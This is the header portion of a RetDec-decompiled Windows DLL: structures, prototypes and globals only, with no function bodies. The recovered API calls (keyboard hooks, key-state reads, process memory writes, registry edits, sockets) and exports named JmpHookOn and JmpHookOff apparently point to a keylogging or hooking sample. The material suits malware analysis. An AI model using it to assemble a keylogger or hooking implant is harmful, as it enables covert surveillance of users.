//
// This file was generated by the Retargetable Decompiler
// Website: https://retdec.com
// Copyright (c) Retargetable Decompiler <info@retdec.com>
//

#include <arpa/inet.h>
#include <netdb.h>
#include <netinet/in.h>
#include <stdbool.h>
#include <stdint.h>
#include <stdlib.h>
#include <sys/socket.h>
#include <unistd.h>
#include <windows.h>

// ---------------- Integer Types Definitions -----------------

typedef int64_t int224_t;

// ----------------- Float Types Definitions ------------------

typedef float float32_t;
typedef long double float80_t;

// ------------------------ Structures ------------------------

struct WSAData {
    int16_t e0;
    int16_t e1;
    int16_t e2;
    int16_t e3;
    char * e4;
    char e5[1];
    char e6[1];
};

struct _LARGE_INTEGER {
    int64_t e0;
};

struct _LIST_ENTRY {
    struct _LIST_ENTRY * e0;
    struct _LIST_ENTRY * e1;
};

struct _LIST_ENTRY {
    struct _LIST_ENTRY * e0;
    struct _LIST_ENTRY * e1;
};

struct _OVERLAPPED {
    int32_t e0;
    int32_t e1;
    int32_t e2;
    int32_t * e3;
};

struct _RTL_CRITICAL_SECTION {
    struct _RTL_CRITICAL_SECTION_DEBUG * e0;
    int32_t e1;
    int32_t e2;
    int32_t * e3;
    int32_t * e4;
    int32_t e5;
};

struct _RTL_CRITICAL_SECTION_DEBUG {
    int16_t e0;
    int16_t e1;
    struct _RTL_CRITICAL_SECTION * e2;
    struct _LIST_ENTRY e3;
    int32_t e4;
    int32_t e5;
    int32_t e6;
    int16_t e7;
    int16_t e8;
};

struct _SECURITY_ATTRIBUTES {
    int32_t e0;
    int32_t * e1;
    bool e2;
};

struct _STARTUPINFOA {
    int32_t e0;
    char * e1;
    char * e2;
    char * e3;
    int32_t e4;
    int32_t e5;
    int32_t e6;
    int32_t e7;
    int32_t e8;
    int32_t e9;
    int32_t e10;
    int32_t e11;
    int16_t e12;
    int16_t e13;
    char * e14;
    int32_t * e15;
    int32_t * e16;
    int32_t * e17;
};

struct hostent {
    char * e0;
    char ** e1;
    int16_t e2;
    int16_t e3;
    char ** e4;
};

struct in_addr {
    int32_t e0;
};

struct sockaddr {
    int16_t e0;
    char e1[14];
};

struct tagPOINT {
    int32_t e0;
    int32_t e1;
};

struct tagMSG {
    int32_t * e0;
    int32_t e1;
    int32_t e2;
    int32_t e3;
    int32_t e4;
    struct tagPOINT e5;
};

// ------------------- Function Prototypes --------------------

int32_t DllCanUnloadNow(void);
int32_t DllGetClassObject(int32_t a1);
int32_t DllRegisterServer(void);
int32_t DllUnregisterServer(void);
int32_t entry_point(void);
int32_t function_401023(void);
int32_t function_401028(void);
int32_t function_401038(void);
int32_t function_401056(void);
int32_t function_40105b(void);
int32_t function_401063(void);
int32_t function_40110a(void);
int32_t function_40110d(int32_t a1, int16_t a2);
void function_4011d6(int32_t uExitCode);
int32_t function_4011de(int32_t * hWnd, char * lpText, char * lpCaption, int32_t uType);
bool function_4011e6(int32_t * hLibModule);
char * function_4011ee(void);
int32_t function_4011f6(int32_t Locale, int32_t LCType, char * lpLCData, int32_t cchData);
void function_4011fe(struct _STARTUPINFOA * lpStartupInfo);
int32_t function_401206(void);
int32_t function_40120e(int32_t a1);
int32_t function_401216(int32_t a1, int32_t a2, int32_t * a3, int32_t a4, int32_t a5, char * a6, int32_t a7);
int32_t function_40121e(int32_t a1);
int32_t function_401226(int16_t ** pbstr, int16_t * psz, int32_t len);
void function_40122e(int16_t * bstrString);
int32_t function_401236(void);
int32_t function_40123e(void);
bool function_401246(struct _LARGE_INTEGER * lpPerformanceCount);
int32_t function_40124e(void);
int32_t function_401256(void);
int32_t function_40127a(void);
int32_t function_401282(void);
int32_t * function_40128a(int32_t * lpAddress, int32_t dwSize, int32_t flAllocationType, int32_t flProtect);
bool function_401292(int32_t * lpAddress, int32_t dwSize, int32_t dwFreeType);
void function_40129a(struct _RTL_CRITICAL_SECTION * lpCriticalSection);
void function_4012a2(struct _RTL_CRITICAL_SECTION * lpCriticalSection);
void function_4012aa(struct _RTL_CRITICAL_SECTION * lpCriticalSection);
void function_4012b2(struct _RTL_CRITICAL_SECTION * lpCriticalSection);
int32_t function_4012ba(int32_t a1, int32_t a2);
int32_t function_40130a(void);
int32_t function_401312(void);
int32_t function_401342(void);
int32_t function_40135a(void);
int32_t function_4013ca(void);
int32_t function_40145e(void);
int32_t function_4014c2(void);
int32_t function_40153a(void);
int32_t function_4015f2(void);
int32_t function_401686(int32_t a1, int32_t a2, int32_t a3);
int32_t function_401706(int32_t a1);
int32_t function_401796(int32_t a1, int32_t a2);
int32_t function_4018ba(void);
int32_t function_401946(int32_t a1);
int32_t function_4019fc(void);
int32_t function_401a01(void);
int32_t function_401a03(int32_t a1);
int32_t function_401a0a(void);
int32_t function_401aea(void);
int32_t function_401b4e(int32_t a1, int32_t a2, int32_t a3, int32_t a4);
int32_t function_401b7e(void);
int32_t function_401bae(void);
int32_t function_401bd2(void);
int32_t function_401bfa(void);
int32_t function_401c6a(void);
int32_t function_401ca2(int32_t a1, int32_t a2, int32_t a3);
int32_t function_401d52(void);
int32_t function_401dda(void);
int32_t function_401e26(void);
int32_t function_401eb2(void);
int32_t function_401ede(void);
int32_t function_401f12(void);
int32_t function_401f3e(void);
int32_t function_402032(void);
int32_t function_4021ae(void);
int32_t function_4021b3(void);
int32_t function_4021b5(int32_t a1, int32_t a2, int32_t a3, int32_t a4, int32_t a5, int32_t a6);
int32_t function_4021c2(void);
int32_t function_402354(void);
int32_t function_402359(void);
int32_t function_40235b(int32_t a1, int32_t a2, int32_t a3, int32_t a4, int32_t a5);
int32_t function_402366(void);
int32_t function_402542(int32_t a1);
int32_t function_4025f3(void);
int32_t function_4025f8(void);
int32_t function_4025fa(int32_t a1, int32_t a2, int32_t a3, int32_t a4, int32_t a5);
int32_t function_402606(void);
int32_t function_402626(void);
int32_t function_402646(void);
int32_t function_402696(void);
int32_t function_4026a1(void);
int32_t function_4026a2(void);
int32_t function_4026e9(int32_t a1, int32_t a2);
int32_t function_4026ee(int32_t a1);
int32_t function_4026f9(void);
int32_t function_4026fa(int32_t a1, int32_t a2);
int32_t function_40270a(void);
int32_t function_40274a(void);
int32_t function_402772(void);
int32_t function_402782(int32_t a1, int32_t a2, int32_t a3, int32_t a4, int32_t a5);
int32_t function_40278a(void);
int32_t function_4027e2(void);
int32_t function_4027fe(void);
int32_t function_40286e(void);
int32_t function_40288e(void);
int32_t function_4028ee(int32_t a1, int32_t a2);
int32_t function_4028fa(void);
int32_t function_4029ce(void);
int32_t function_4029da(void);
int32_t function_4029fe(int32_t nTypeFlag);
int32_t function_402a06(void);
int32_t function_402a36(void);
int32_t function_402acd(int32_t a1, int32_t a2, int32_t a3, int32_t a4, int32_t a5, int32_t a6, int32_t a7, int32_t a8, int32_t a9, int32_t a10, int32_t a11, int32_t a12, int32_t a13, int32_t a14, int32_t a15, int32_t a16, int32_t a17, int32_t a18);
int32_t function_402bb2(int32_t a1);
int32_t function_402bd2(int32_t a1, int32_t a2);
int32_t function_402c02(void);
int32_t function_402c0a(void);
int32_t function_402c0e(void);
int32_t function_402c12(void);
int32_t function_402c16(void);
int32_t function_402c3c(void);
int32_t function_402c3e(void);
int32_t function_402c67(void);
int32_t function_402c6c(int32_t a1);
int32_t function_402c8e(void);
int32_t function_402c96(void);
int32_t function_402ca6(void);
int32_t function_402cb6(void);
int32_t function_402cd2(void);
int32_t function_402cf6(int32_t a1, int32_t a2);
int32_t function_402d0e(int32_t a1);
int32_t function_402d22(int32_t a1, int32_t a2, int32_t a3);
int32_t function_402d42(int32_t a1, int32_t a2, int32_t a3, int32_t a4);
int32_t function_402d6a(void);
int32_t function_402d86(int32_t a1, int32_t a2, int32_t a3);
int32_t function_402da6(int32_t a1, int32_t a2, int32_t a3);
int32_t function_402ed2(int32_t a1, int32_t a2);
int32_t function_402f0a(int32_t a1);
int32_t function_402f5e(int32_t a1);
int32_t function_402f8d(void);
int32_t function_402f8e(int32_t a1, int32_t result);
int32_t function_402fa3(void);
int32_t function_402fa6(int32_t a1);
int32_t function_403042(int32_t a1);
int32_t function_403046(int32_t a1, int32_t a2);
int32_t function_4030e6(void);
int32_t function_403106(void);
int32_t function_40312e(void);
int32_t function_40318e(int32_t a1);
int32_t function_4031ee(int32_t a1);
int32_t function_4032b5(void);
int32_t function_4032b6(void);
int32_t function_403312(void);
int32_t function_40333f(void);
int32_t function_403342(void);
int32_t function_4033ce(void);
int32_t function_4034a1(int32_t a1, int32_t a2, int32_t a3, int32_t a4);
int32_t function_4034a6(void);
int32_t function_4034b0(void);
int32_t function_4034b2(int32_t a1);
int32_t function_4034bd(void);
int32_t function_4034be(void);
int32_t function_4034e2(void);
int32_t function_403512(void);
int32_t function_403556(void);
int32_t function_403582(void);
int32_t function_4035b2(void);
int32_t function_4035c2(void);
int32_t function_4035ee(void);
int32_t function_4035f2(void);
int32_t function_4035fc(void);
int32_t function_4035fe(void);
int32_t function_403615(void);
int32_t function_403616(void);
int32_t function_40361e(void);
int32_t function_403662(void);
int32_t function_4036d5(void);
int32_t function_4036d6(int32_t result);
int32_t function_40375f(void);
int32_t function_403762(void);
int32_t function_403806(void);
int32_t function_403816(void);
int32_t function_403822(void);
int32_t function_403866(int32_t a1, int32_t a2, int32_t a3);
int32_t function_40386b(void);
int32_t function_40386e(void);
int32_t function_403873(void);
int32_t function_403876(int32_t * a1);
int32_t function_4038b5(void);
int32_t function_4038b6(void);
int32_t function_4038fe(void);
int32_t function_40395a(void);
int32_t function_4039a2(void);
int32_t function_403a06(void);
int32_t function_403a0d(void);
int32_t function_403a0e(void);
int32_t function_403a26(int32_t a1, int32_t a2, int32_t a3, int32_t a4);
int32_t function_403a4a(void);
int32_t function_403a6e(void);
int32_t function_403aa2(void);
int32_t function_403ab9(void);
int32_t function_403aba(void);
int32_t function_403ba6(void);
int32_t function_403bbd(void);
int32_t function_403bbe(void);
int32_t function_403cda(int32_t a1);
int32_t function_403dcc(void);
int32_t function_403dce(void);
int32_t function_403dd5(void);
int32_t function_403dd6(void);
int32_t function_403dde(void);
int32_t function_403de6(int32_t a1);
int32_t function_403df6(int32_t a1, int32_t a2, int32_t a3, int32_t a4, int32_t a5, int32_t a6, int32_t a7, int32_t a8, int32_t a9);
int32_t function_403dfb(void);
int32_t function_403dfe(int32_t a1, int32_t a2);
int32_t function_403e06(int32_t a1);
int32_t function_403f92(void);
int32_t function_403f9e(void);
int32_t function_403fda(void);
int32_t function_404002(void);
int32_t function_40405e(void);
int32_t function_40406e(void);
int32_t function_4040d2(void);
int32_t function_4040d7(void);
int32_t function_4040d9(int32_t a1, int32_t a2);
int32_t function_4040de(void);
int32_t function_4040f6(void);
int32_t function_404122(void);
int32_t function_404188(void);
int32_t function_40418d(void);
int32_t function_40418f(int32_t a1);
int32_t function_404196(void);
int32_t function_4041e0(void);
int32_t function_4041e5(void);
int32_t function_4041e7(int32_t a1);
int32_t function_4041ea(void);
int32_t * function_4042be(int32_t uFlags, int32_t uBytes);
int32_t * function_4042c6(int32_t * hMem);
int32_t function_4042ce(void);
bool function_4042d6(int32_t dwTlsIndex);
int32_t * function_4042de(int32_t dwTlsIndex);
bool function_4042e6(int32_t dwTlsIndex, int32_t * lpTlsValue);
int32_t function_4042ee(void);
int32_t function_4042fa(int32_t a1);
int32_t function_404302(void);
int32_t function_404346(void);
int32_t function_404372(void);
int32_t function_40439a(void);
int32_t function_4043be(void);
int32_t function_4043fe(int32_t a1, int32_t a2);
int32_t function_40440a(void);
int32_t function_404452(void);
int32_t function_404477(void);
int32_t function_40447c(void);
int32_t function_40447e(int32_t a1);
int32_t function_404482(void);
int32_t function_40448a(void);
int32_t function_4044af(void);
int32_t function_4044b4(void);
int32_t function_4044b6(int32_t a1);
int32_t function_4044ba(void);
int32_t function_4044c2(int32_t * hKey);
int32_t function_4044ca(int32_t * hKey, char * lpSubKey, int32_t Reserved, char * lpClass, int32_t dwOptions, int32_t samDesired, struct _SECURITY_ATTRIBUTES * lpSecurityAttributes, int32_t ** phkResult, int32_t * lpdwDisposition);
int32_t function_4044d2(int32_t * hKey, char * lpSubKey);
int32_t function_4044da(int32_t * hKey, char * lpSubKey, int32_t ulOptions, int32_t samDesired, int32_t ** phkResult);
int32_t function_4044e2(int32_t * hKey, char * lpValueName, int32_t * lpReserved, int32_t * lpType, char * lpData, int32_t * lpcbData);
int32_t function_4044ea(int32_t * hKey, char * lpValueName, int32_t Reserved, int32_t dwType, char * lpData, int32_t cbData);
bool function_4044f2(int32_t * hObject);
int32_t function_4044fa(int32_t Locale, int32_t dwCmpFlags, char * lpString1, int32_t cchCount1, char * lpString2, int32_t cchCount2);
bool function_404502(char * lpExistingFileName, char * lpNewFileName, bool bFailIfExists);
int32_t * function_40450a(char * lpFileName, int32_t dwDesiredAccess, int32_t dwShareMode, struct _SECURITY_ATTRIBUTES * lpSecurityAttributes, int32_t dwCreationDisposition, int32_t dwFlagsAndAttributes, int32_t * hTemplateFile);
int32_t * function_404512(struct _SECURITY_ATTRIBUTES * lpThreadAttributes, int32_t dwStackSize, int32_t (*lpStartAddress)(int32_t *), int32_t * lpParameter, int32_t dwCreationFlags, int32_t * lpThreadId);
bool function_40451a(char * lpFileName);
int32_t function_404522(int32_t a1);
int32_t * function_40452a(int32_t * hModule, char * lpName, char * lpType);
void function_404532(int32_t * hLibModule, int32_t dwExitCode);
int32_t * function_40453a(void);
int32_t function_404542(int32_t * hFile, int32_t * lpFileSizeHigh);
int32_t function_40454a(int32_t * hModule, char * lpFilename, int32_t nSize);
int32_t * function_404552(char * lpModuleName);
int32_t (*function_40455a(int32_t * hModule, char * lpProcName))();
int32_t function_404562(int32_t nBufferLength, char * lpBuffer);
int32_t function_40456a(void);
int32_t * function_404572(int32_t uFlags, int32_t dwBytes);
int32_t * function_40457a(int32_t * hMem);
int32_t * function_404582(int32_t * hMem);
bool function_40458a(int32_t * hMem);
int32_t * function_404592(char * lpLibFileName);
bool function_40459a(int32_t * hFile, int32_t * lpBuffer, int32_t nNumberOfBytesToRead, int32_t * lpNumberOfBytesRead, struct _OVERLAPPED * lpOverlapped);
bool function_4045a2(int32_t * hFile);
void function_4045aa(int32_t dwMilliseconds);
bool function_4045b2(int32_t * lpAddress, int32_t dwSize, int32_t flNewProtect, int32_t * lpflOldProtect);
int32_t function_4045ba(void);
bool function_4045c2(int32_t * hProcess, int32_t * lpBaseAddress, int32_t * lpBuffer, int32_t nSize, int32_t * lpNumberOfBytesWritten);
int32_t function_4045ca(char * lpString1, char * lpString2);
char * function_4045d2(char * lpString1, char * lpString2);
bool function_4045da(int32_t * hdc, int32_t iFirst, int32_t iLast, int32_t * lpBuffer);
int32_t * function_4045e2(int32_t i);
int32_t * function_4045ea(int32_t * hdc, int32_t * h);
int32_t function_4045f2(int32_t * hhk, int32_t nCode, int32_t wParam, int32_t lParam);
bool function_4045fa(void);
int32_t function_404602(int32_t * hWnd, int32_t Msg, int32_t wParam, int32_t lParam);
int32_t function_40460a(struct tagMSG * lpMsg);
bool function_404612(bool (*lpEnumFunc)(int32_t *, int32_t), int32_t lParam);
int32_t * function_40461a(char * lpClassName, char * lpWindowName);
int32_t * function_404622(int32_t * hWndParent, int32_t * hWndChildAfter, char * lpszClass, char * lpszWindow);
bool function_40462a(struct tagPOINT * lpPoint);
int32_t function_404632(int32_t * hWnd, int32_t nIndex);
int32_t function_40463a(int32_t * hWnd, char * lpClassName, int32_t nMaxCount);
int32_t * function_404642(int32_t uFormat);
int32_t * function_40464a(int32_t * hWnd);
bool function_404652(char * lpKeyState);
bool function_40465a(struct tagMSG * lpMsg, int32_t * hWnd, int32_t wMsgFilterMin, int32_t wMsgFilterMax);
int32_t * function_404662(int32_t * hWnd);
int32_t * function_40466a(int32_t * hWnd);
int32_t * function_404672(int32_t * hWnd, int32_t uCmd);
int32_t function_40467a(int32_t * hWnd, int32_t nIndex);
int32_t function_404682(int32_t * hWnd, int32_t * lpdwProcessId);
bool function_40468a(int32_t * hWnd);
bool function_404692(int32_t * hWnd);
bool function_40469a(int32_t * hWnd, int32_t uIDEvent);
int32_t * function_4046a2(int32_t * hInstance, char * lpIconName);
bool function_4046aa(int32_t * hWndNewOwner);
bool function_4046b2(int32_t * hWnd, int32_t Msg, int32_t wParam, int32_t lParam);
void function_4046ba(int32_t nExitCode);
int32_t function_4046c2(int32_t * hWnd, int32_t * hDC);
int32_t function_4046ca(int32_t * hWnd, int32_t Msg, int32_t wParam, int32_t lParam);
int32_t function_4046d2(int32_t * hWnd, int32_t nIDEvent, int32_t uElapse, void (*lpTimerFunc)(int32_t *, int32_t, int32_t, int32_t));
int32_t function_4046da(int32_t * hWnd, int32_t nIndex, int32_t dwNewLong);
int32_t * function_4046e2(int32_t idHook, int32_t (*lpfn)(int32_t, int32_t, int32_t), int32_t * hmod, int32_t dwThreadId);
int32_t function_4046ea(int32_t uVirtKey, int32_t uScanCode, char * lpKeyState, int16_t * lpChar, int32_t uFlags);
bool function_4046f2(int32_t * hhk);
int32_t function_4046fa(void);
int32_t * function_404702(int32_t dwExStyle, char * lpClassName, char * lpWindowName, int32_t dwStyle, int32_t X, int32_t Y, int32_t nWidth, int32_t nHeight, int32_t * hWndParent, int32_t * hMenu, int32_t * hInstance, int32_t * lpParam);
int32_t function_40470a(int32_t hWndParent, int32_t nHeight, int32_t nWidth, int32_t Y, int32_t X, int32_t dwStyle, int32_t lpWindowName, int32_t lpClassName, int32_t dwExStyle);
int32_t function_404762(void);
int32_t function_404787(void);
int32_t function_40478c(void);
int32_t function_40478e(int32_t a1);
int32_t function_404792(void);
int32_t function_40479d(void);
int32_t function_40480f(void);
int32_t function_404814(void);
int32_t function_404816(int32_t a1);
int32_t function_40481a(void);
int32_t function_404822(void);
int32_t function_40485e(void);
int32_t function_404883(void);
int32_t function_404888(void);
int32_t function_40488a(int32_t a1);
int32_t function_40488e(void);
int32_t function_404896(void);
int32_t function_4048bb(void);
int32_t function_4048c0(void);
int32_t function_4048c2(int32_t a1);
int32_t function_4048c6(void);
int32_t function_4048ce(int32_t s);
int32_t function_4048d6(int32_t s, struct sockaddr * name, int32_t namelen);
int16_t function_4048de(int16_t hostshort);
char * function_4048e6(struct in_addr in);
int32_t function_4048ee(int32_t s, char * buf, int32_t len, int32_t flags);
int32_t function_4048f6(int32_t s, char * buf, int32_t len, int32_t flags);
int32_t function_4048fe(int32_t af, int32_t type, int32_t protocol);
struct hostent * function_404906(char * name);
int32_t function_40490e(char * name, int32_t namelen);
int32_t function_404916(int16_t wVersionRequested, struct WSAData * lpWSAData);
int32_t function_40491e(void);
int32_t function_404926(void);
int32_t function_40494b(void);
int32_t function_404950(void);
int32_t function_404952(int32_t a1);
int32_t function_404956(void);
int32_t function_40495e(int32_t a1, int32_t a2, int32_t a3);
int32_t function_404b5a(int32_t a1);
int32_t function_404b5e(void);
int32_t * function_404b66(int32_t * hwnd, char * lpOperation, char * lpFile, char * lpParameters, char * lpDirectory, int32_t nShowCmd);
int32_t function_404b6e(void);
int32_t function_404b93(void);
int32_t function_404b98(void);
int32_t function_404b9a(int32_t a1);
int32_t function_404b9e(void);
int32_t function_404ba6(void);
int32_t function_404bcb(void);
int32_t function_404bd0(void);
int32_t function_404bd2(int32_t a1);
int32_t function_404bd6(void);
int32_t function_404bde(void);
int32_t function_404c03(void);
int32_t function_404c08(void);
int32_t function_404c0a(int32_t a1);
int32_t function_404c0e(void);
int32_t function_404c16(int32_t * a1, char * a2, char * a3, int32_t a4, int32_t * a5);
int32_t function_404c1e(void);
int32_t function_404c43(void);
int32_t function_404c48(void);
int32_t function_404c4a(int32_t a1);
int32_t function_404c4e(void);
int32_t function_404c56(void);
int32_t function_404c6e(void);
int32_t function_404d92(void);
int32_t function_404d97(void);
int32_t function_404d99(int32_t a1, int32_t a2, int32_t a3);
int32_t function_404dbd(void);
int32_t function_404dc6(void);
int32_t function_404e34(void);
int32_t function_404e39(void);
int32_t function_404e3b(int32_t a1, int32_t a2, int32_t a3, int32_t a4);
int32_t function_404e45(void);
int32_t function_404e73(void);
int32_t function_404e78(void);
int32_t function_404e7a(int32_t a1);
int32_t function_404e7e(void);
int32_t function_404e86(void);
int32_t function_404f09(int32_t a1, int32_t a2, int32_t a3, int32_t a4, int32_t a5, int32_t a6, int32_t a7);
int32_t function_404fdc(void);
int32_t function_404fe1(void);
int32_t function_404fe3(void);
int32_t function_404fe7(int32_t a1, int32_t result, int32_t a3, int32_t a4, int32_t a5, int32_t a6, int32_t a7, int32_t a8);
int32_t function_4050d6(void);
int32_t function_4050fb(void);
int32_t function_405100(void);
int32_t function_405102(int32_t a1);
int32_t function_405106(void);
int32_t function_40510e(int32_t a1, int32_t a2, int32_t a3);
int32_t function_405222(void);
int32_t function_405227(void);
int32_t function_405229(int32_t a1, int32_t a2, int32_t a3);
int32_t function_405232(int32_t a1, int32_t a2, int32_t a3);
int32_t function_4052f1(void);
int32_t function_4052f6(void);
int32_t function_4052f8(int32_t a1, int32_t a2, int32_t a3, int32_t a4, int32_t a5);
int32_t function_4052fe(int32_t a1, int32_t a2, int32_t a3);
int32_t function_405378(void);
int32_t function_40537d(void);
int32_t function_40537f(int32_t a1, int32_t a2, int32_t a3);
int32_t function_405383(void);
int32_t function_4053fe(int32_t hhk, int32_t nCode, int32_t wParam);
int32_t function_405446(void);
int32_t function_40547e(void);
int32_t function_405496(void);
int32_t function_4054bb(void);
int32_t function_4054c0(void);
int32_t function_4054c2(int32_t a1);
int32_t function_4054c6(void);
int32_t function_4054d1(int32_t a1, uint32_t a2, uint32_t a3);
int32_t function_40558a(void);
int32_t function_405746(void);
int32_t function_40574b(void);
int32_t function_40574d(int32_t a1, int32_t a2);
int32_t function_405756(void);
int32_t function_4057b2(void);
int32_t function_405856(void);
int32_t function_40585b(void);
int32_t function_40585d(int32_t a1, int32_t a2, int32_t a3);
int32_t function_405866(void);
int32_t function_405872(void);
int32_t function_4058e3(void);
int32_t function_4058e8(void);
int32_t function_4058ea(int32_t a1);
int32_t function_4058f2(void);
int32_t function_40591e(int32_t a1, int32_t a2, int32_t a3, int32_t a4);
int32_t function_405b93(void);
int32_t function_405b98(void);
int32_t function_405b9a(int32_t a1);
int32_t function_405c65(void);
int32_t function_405cad(void);
int32_t function_405cb2(void);
int32_t function_405cb4(int32_t a1);
int32_t function_405cb6(void);
int32_t function_405cbe(void);
int32_t function_405dd3(int32_t a1, int32_t a2, int32_t a3, int32_t a4, int32_t a5, int32_t a6, int32_t a7, int32_t a8);
int32_t function_405ece(void);
int32_t function_405f05(void);
int32_t function_405f0a(void);
int32_t function_405f0c(int32_t a1);
int32_t function_405f0e(void);
int32_t function_405f50(void);
int32_t function_405f55(void);
int32_t function_405f57(int32_t a1);
int32_t function_405f5a(int32_t a1);
int32_t function_405f5d(int32_t a1);
int32_t function_40609d(void);
int32_t function_4060a2(void);
int32_t function_4060a4(int32_t a1, int32_t a2, int32_t a3);
int32_t function_4060b5(void);
int32_t function_4060c4(void);
int32_t function_4060ce(int32_t a1);
int32_t function_4060de(void);
int32_t function_406103(void);
int32_t function_406108(void);
int32_t function_40610a(int32_t a1);
int32_t function_40610e(void);
int32_t function_406116(void);
int32_t function_406151(void);
int32_t function_40618a(void);
int32_t function_4061aa(void);
int32_t function_4061b6(void);
int32_t function_4061de(void);
int32_t function_4061fe(void);
int32_t function_406223(void);
int32_t function_406228(void);
int32_t function_40622a(int32_t a1);
int32_t function_40622e(void);
int32_t function_406236(void);
int32_t function_40623e(void);
int32_t function_4062ca(void);
int32_t function_4062cf(void);
int32_t function_4062d1(int32_t a1, int32_t a2, int32_t a3, int32_t a4, int32_t a5);
int32_t function_4062da(void);
int32_t function_406312(void);
int32_t function_406459(void);
int32_t function_40645e(void);
int32_t function_406460(int32_t a1);
int32_t function_406485(int32_t a1, int32_t a2);
int32_t function_4066e4(void);
int32_t function_4066e9(void);
int32_t function_4066eb(int32_t a1);
int32_t function_406715(void);
int32_t function_40671d(void);
int32_t function_406724(void);
int32_t function_406760(void);
float80_t function_406762(int32_t a1);
int32_t function_4067e6(void);
int32_t function_40681b(int32_t a1, uint32_t a2, int32_t a3, int32_t a4, int32_t lpClassName, int32_t a6, int32_t a7);
int32_t function_40693b(int32_t a1, uint32_t a2, int32_t a3, int32_t a4, int32_t a5, int32_t a6, int32_t a7);
int32_t function_406bb0(void);
int32_t function_406bb5(void);
int32_t function_406bb7(int32_t a1, int32_t a2, int32_t a3);
int32_t function_406bee(void);
int32_t function_406cf2(void);
int32_t function_406cf7(void);
int32_t function_406cf9(int32_t a1, int32_t a2, int32_t a3);
int32_t function_406d2e(void);
int32_t function_406e1d(void);
int32_t function_406e22(void);
int32_t function_406e24(int32_t a1, int32_t a2, int32_t a3);
int32_t function_406e2e(void);
int32_t function_406e74(void);
int32_t function_406e79(void);
int32_t function_406e7b(int32_t a1);
int32_t function_406e7e(void);
int32_t function_406ec0(void);
int32_t function_406ec5(void);
int32_t function_406ec7(int32_t a1);
bool function_406eca(char * pszPath);
int32_t function_406ed2(void);
int32_t function_406f12(int32_t a1, int32_t nIndex);
int32_t function_406fe4(void);
int32_t function_406fe9(void);
int32_t function_406feb(int32_t a1, int32_t a2, int32_t a3);
int32_t function_406ff6(int32_t a1, uint32_t a2, int32_t a3);
int32_t function_40707e(void);
int32_t function_407096(int32_t a1);
int32_t function_4070ae(void);
int32_t function_4070c2(void);
int32_t function_4070ea(void);
int32_t function_40711e(void);
int32_t function_407156(void);
int32_t function_407196(void);
int32_t function_4071ce(void);
int32_t function_4071fe(void);
int32_t function_407278(void);
int32_t function_40727d(void);
int32_t function_40727f(int32_t a1, int32_t a2, int32_t a3, int32_t a4, int32_t a5);
int32_t function_40728a(void);
int32_t function_4072eb(void);
int32_t function_4072f0(void);
int32_t function_4072f2(int32_t a1, int32_t a2, int32_t a3, int32_t a4);
int32_t function_40730d(void);
float80_t function_407315(void);
int32_t function_40731a(void);
int32_t function_407399(void);
int32_t function_40739e(void);
int32_t function_4073a0(int32_t a1, int32_t a2, int32_t a3);
int32_t function_4073b6(void);
int32_t function_407412(void);
int32_t function_40751f(void);
int32_t function_407524(void);
int32_t function_407526(int32_t a1, int32_t a2, int32_t a3, int32_t a4);
int32_t function_407546(void);
int32_t function_40755e(void);
int32_t function_4075ca(void);
int32_t function_4075ef(void);
int32_t function_4075f4(void);
int32_t function_4075f6(int32_t a1);
int32_t function_4075fa(void);
int32_t function_407602(int32_t nCode, int32_t wParam, int32_t lParam);
int32_t function_40765a(void);
int32_t function_40767f(void);
int32_t function_407684(void);
int32_t function_407686(int32_t a1);
int32_t function_40768a(void);
int32_t * function_407692(int32_t * Base, char MappedAsImage, int16_t DirectoryEntry, int32_t * Size);
int32_t function_40769a(void);
int32_t function_4076bf(void);
int32_t function_4076c4(void);
int32_t function_4076c6(int32_t a1);
int32_t function_4076ca(void);
int32_t function_4076d2(int32_t a1, int32_t a2);
int32_t function_4077b6(void);
int32_t function_4077fe(int32_t a1);
int32_t function_4078b6(int32_t a1, int32_t a2, int32_t a3, int32_t a4, int32_t a5);
int32_t function_4078ba(void);
int32_t function_4078df(void);
int32_t function_4078e4(void);
int32_t function_4078e6(int32_t a1);
int32_t function_4078ea(void);
int32_t function_4078f2(int32_t a1, int32_t a2, int32_t a3, int32_t a4, int32_t a5, int32_t a6);
int32_t function_40793e(int32_t a1, int32_t a2, int32_t a3, int32_t a4);
int32_t function_40796e(int32_t a1, int32_t a2, int32_t a3, int32_t a4, int32_t a5, int32_t a6);
int32_t function_407a06(void);
int32_t function_407a0b(void);
int32_t function_407a0d(int32_t a1, int32_t a2, int32_t a3, int32_t a4, int32_t a5);
int32_t function_407a1d(void);
int32_t function_407a1f(int32_t result2, int32_t a2, int32_t a3, int32_t a4, int32_t a5, int32_t a6, int32_t a7, int32_t a8, int32_t a9, int32_t a10, int32_t a11, int32_t a12, int32_t a13, int32_t a14);
int32_t function_407b96(void);
int32_t function_407b9e(void);
int32_t function_407baa(void);
int32_t function_407bc9(void);
int32_t function_407bce(void);
int32_t function_407bd0(int32_t a1);
int32_t function_407be2(void);
int32_t function_407c84(int32_t a1, uint32_t a2, int32_t a3, uint32_t lpFilename, int32_t a5, int32_t a6, int32_t a7);
int32_t function_407f5b(void);
int32_t function_407f60(void);
int32_t function_40e000(int32_t * a1);
int32_t function_96004041(void);
int32_t function_afceb517(void);
int32_t function_b8f9fe79(void);
int32_t function_ce239cad(void);
int32_t JmpHookOff(void);
int32_t JmpHookOn(void);
int32_t unknown_4f8e(void);
int32_t unknown_5066(void);

// --------------------- Global Variables ---------------------

int32_t g1 = 37; // 0x404dc2
int32_t g2 = 62; // 0x405bfa
int32_t g3 = 46; // 0x405c5e
int32_t g4 = 41; // 0x40647e
int32_t g5 = 47; // 0x406706
int32_t g6 = 47; // 0x406d1e
int32_t g7 = 0x6f485408; // 0x40771e
int32_t g8 = 0; // 0x408000
int32_t g9 = 0; // 0x408004
int32_t g10 = 0; // 0x408008
int32_t g11 = 0x408d02; // 0x40800c
int32_t g12 = 0; // 0x408010
int32_t g13 = 0; // 0x408014
int16_t g14 = 0x1332; // 0x408018
char g15 = 0; // 0x40801c
char g16 = 0; // 0x408020
char g17 = 0; // 0x408024
int32_t g18 = 0; // 0x408028
int32_t g19 = 0; // 0x40802c
char * g20 = "0123456789ABCDEF\xff\xff\xff\xff"; // 0x408080
int32_t g21 = -1; // 0x408090
int32_t g22 = 0; // 0x408094
int32_t g23 = 0; // 0x408098
int32_t g24 = 0; // 0x40809c
int32_t g25 = 0; // 0x4080a0
int32_t g26 = 0x408d01; // 0x4080f0
int32_t g27 = 1; // 0x4080f8
int32_t g28 = 0; // 0x408104
int32_t g29 = 0; // 0x408108
int32_t g30 = 0; // 0x40810c
int32_t g31 = 0; // 0x408118
int32_t g32; // 0x40812c
int32_t g33; // 0x408138
